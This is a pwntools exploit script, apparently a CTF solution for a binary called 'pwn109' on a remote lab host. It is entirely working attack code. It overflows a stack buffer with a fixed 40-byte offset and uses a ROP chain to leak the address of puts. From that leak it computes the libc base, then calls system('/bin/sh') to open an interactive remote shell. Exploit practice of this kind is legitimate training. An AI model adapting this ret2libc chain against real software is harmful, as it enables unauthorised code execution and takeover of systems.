from pwn import *

def find_rip(payload):
    p = process(exe)
    p.sendline(payload)
    p.wait()                    # wait process to crash
    rip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64
    info('located RIP offset at {a}'.format(a=rip_offset))

exe = './pwn109'
elf = context.binary = ELF(exe) # will exec checksec
context.log_level = 'debug'     # a lot of debug info
#libc = ELF('/usr/lib/libc.so.6')# load our own libc for testing exploit
libc = ELF('./libc.so.6')      # load libc from remote server
rop = ROP(elf)

#offset = find_rip(cyclic(100))
#exit()
offset = 40

#p = process(exe)                # start program
p = remote('10.10.92.215', 9009)
pop_rdi = 0x4012a3              # $ ropper --file pwn109 --search "pop rdi"

payload = flat(
    b'A' * offset,              # padding
    pop_rdi,                    # pop rdi for our argument
    elf.got.puts,               # fill rdi with addr of puts
    elf.plt.puts,               # call puts function
    elf.symbols.main,           # return to main
)

p.recvuntil(b'ahead')
p.recvline()
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8,b'\0')) # retrieve addr of puts(elf.got.puts)

p.recvuntil(b'ahead')
p.recvline()

log.info(f'Gets leak => {hex(leak)}')           # leaked addr of elf.got.puts
libc.address = leak - libc.symbols.puts         # base libc = leak - libc.symbols.puts
log.info(f'Libc base => {hex(libc.address)}')   # print base libc addr

payload = flat(
    b'A' * offset,
    rop.find_gadget(['pop rdi', 'ret'])[0],     # pop rdi for ou argument
    next(libc.search(b'/bin/sh\x00')),          # our argument is /bin/sh
    rop.find_gadget(['ret'])[0],                # ret instruction for stack align
    libc.symbols.system                         # call system with /bin/sh as argument
)

p.sendline(payload)
p.interactive()                                 # interactive shell

